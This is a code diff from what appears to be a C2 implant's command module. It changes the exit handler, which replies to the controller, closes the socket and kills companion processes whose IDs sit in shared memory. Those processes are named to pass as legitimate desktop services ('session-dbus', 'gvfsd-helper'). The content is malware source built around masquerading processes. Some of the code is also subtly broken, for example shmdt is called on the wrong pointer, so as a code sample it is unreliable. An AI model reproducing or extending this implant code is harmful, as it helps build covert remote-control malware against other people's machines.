@@ -5,6 +5,7 @@
 #include <dlfcn.h>
 #include <stdbool.h>
 #include <fcntl.h>
+#include <unistd.h>
 #include <string.h>
 #include <unistd.h>
 #include <arpa/inet.h>
@@ -14,21 +15,20 @@
 #include <sys/stat.h>
 
 #include "c2_commands.h"
+#include "c2_loop.h"
 
 
 // https://gist.github.com/suyash/2488ff6996c98a8ee3a84fe3198a6f85
-
 
 void c2_exit(char *cmd_id, int sock) {
 
     char *msg  = "exiting!";
     build_c2_response(msg, cmd_id, sock);
+    shutdown(sock, 2);
+    close(sock);
 
     // get pids from sharedmem and kill both pids
     int shmid = shmget(0x64b2e2, 8, 0666);
-
-    shutdown(sock, 2);
-    close(sock);
 
     // if handled on sharedmem cannot be obtained
     if (shmid == -1) {
@@ -38,21 +38,34 @@ void c2_exit(char *cmd_id, int sock) {
         exit(0);
     }
 
-
     int *shmem_pid_addr = (int *)shmat(shmid, NULL, 0);
-    int *tmpPid = (int *)malloc(4);
+    int *gvfsd_pid = (int *)malloc(4);
+    int *sessiondbus_pid = (int *)malloc(4);
+
+    pthread_kill(gettid()+1, 9);
 
     // Get session-dbus pid from sharedmem and kill it
-    memset(tmpPid, 0, 4);
-    memcpy(tmpPid, shmem_pid_addr+4, 4);
-    kill(*tmpPid, SIGKILL);
+    memset(sessiondbus_pid, 0, 4);
+    memcpy(sessiondbus_pid, shmem_pid_addr+4, 4);
+    kill(*sessiondbus_pid, SIGKILL);
+    int shmres = shmdt(&shmid);
+
+    if (shmres != 0) {
+        #ifdef DEBUG
+        fprintf(stderr,"Error obtaining shared mem handle!");
+        #endif
+    }
 
     // Get gvfsd-helper pid from sharedmem  and kill it
-    memset(tmpPid, 0, 4);
-    memcpy(tmpPid, shmem_pid_addr, 4);
-    kill(*tmpPid, SIGKILL);
+    memset(gvfsd_pid, 0, 4);
+    memcpy(gvfsd_pid, shmem_pid_addr, 4);
+    kill(*sessiondbus_pid, SIGKILL);
+    kill(*gvfsd_pid, SIGKILL);
 
-    free(tmpPid);
+    // we won't reach this...
+    free(sessiondbus_pid);
+    free(gvfsd_pid);
+    exit(0);
 }
 
 
